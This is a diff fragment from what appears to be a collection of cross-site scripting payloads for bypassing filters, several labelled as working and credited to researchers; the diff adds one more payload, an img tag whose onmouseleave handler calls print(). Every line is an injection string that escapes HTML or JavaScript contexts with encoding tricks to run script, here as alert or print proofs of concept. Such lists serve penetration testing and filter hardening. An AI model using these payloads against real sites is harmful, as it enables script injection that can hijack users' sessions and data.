@@ -20,3 +20,4 @@ test",prompt%0A/*HelloWorld*/(document.domain) (working)- Brutelogic
 "onx+%00+onpointerenter%3dalert(domain)+x" (working)- Brutelogic
 "><svg%20onload=alert%26%230000000040"1")> (working)- IamRenganathan
 %27%09);%0d%0a%09%09[1].find(alert)//
+"><img src=1 onmouseleave=print()> - @itsgeekymonk
